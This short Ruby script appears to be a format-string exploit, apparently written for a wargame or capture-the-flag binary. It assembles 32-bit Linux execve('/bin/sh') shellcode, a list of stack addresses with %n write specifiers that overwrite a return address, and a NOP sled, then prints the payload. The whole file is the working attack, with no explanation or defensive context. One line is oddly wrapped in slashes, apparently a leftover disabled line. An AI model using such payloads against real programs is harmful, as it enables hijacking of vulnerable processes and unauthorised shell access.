#!/usr/bin/env ruby

shellcode = ""
shellcode += "\xeb\x1c\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43"
shellcode += "\x0c\x89\xc2\x8d\x4b\x08\xb0\x0b\xcd\x80\x31\xdb\x89"
shellcode += "\xd8\x40\xcd\x80\xe8\xdf\xff\xff\xff/bin/sh"

addr_overwrite = ""
addr_overwrite += "\xfc\xfd\xff\xbfjunk"
addr_overwrite += "\xfd\xfd\xff\xbfjunk"
addr_overwrite += "\xfe\xfd\xff\xbfjunk"
addr_overwrite += "\xff\xfd\xff\xbf"
addr_overwrite += "%4x%4x"
addr_overwrite += "%201x%n"
addr_overwrite += "%8x%n"
addr_overwrite += "%49151x%n"
/addr_overwrite += "%10x%n"
/
puts addr_overwrite + "\x90" * 50 + shellcode
